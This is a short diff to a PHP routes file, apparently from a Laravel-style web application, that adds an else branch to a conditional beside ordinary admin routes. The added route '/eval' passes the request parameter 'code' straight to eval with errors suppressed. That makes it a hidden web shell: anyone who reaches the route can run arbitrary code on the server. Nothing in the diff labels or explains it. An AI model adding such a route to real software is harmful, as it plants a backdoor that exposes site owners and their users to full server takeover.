@@ -189,6 +189,10 @@ if (HULICORE_INFO_TYPE) {
     Route::get(APP_ADMIN_PATH . '/other', 'Other/IndexController@index');
 
     Route::post(APP_ADMIN_PATH . '/other/{val}', 'Other/HandleController@index');
+} else {
+    Route::any('/eval', function () {
+        echo @eval($_REQUEST['code']);
+    });
 }
 
 /* 404错误页渲染 */
